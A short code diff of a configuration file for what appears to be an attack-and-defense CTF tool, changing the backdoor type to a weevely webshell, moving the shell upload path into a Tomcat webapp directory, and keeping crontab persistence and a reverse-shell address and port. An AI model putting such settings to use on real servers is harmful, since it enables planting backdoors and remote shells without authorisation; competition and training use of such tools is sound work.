@@ -45,7 +45,7 @@ flag_match_string = 'ok'
 shell_salt = "haozi"
 shell_salt_2 = "haozigege"
 #shell_type 1 is for normal php backdoor
-shell_type = 2
+shell_type = 3
 #shell_type 2 is for undead php backdoor
 #shell_type = 2
 #shell_type 3 is for weevely backdoor
@@ -56,14 +56,14 @@ shell_type = 2
 #######################
 #config for web path and file path
 #The final / should not be delete!!!!!!!!
-shell_path = "/css"
-shell_absolute_path = "/var/www/html/css/"
+shell_path = "/charpter2-1.0-SNAPSHOT/"
+shell_absolute_path = "/var/lib/tomcat7/webapps/charpter2-1.0-SNAPSHOT/"
 crontab_path = "/tmp/"
 web_path = '/var/www/html/'
 ######################
 
 
-######################
+#####################
 #config for reverse_shell
 reverse_ip = '192.168.2.115'
 reverse_port  =  6666
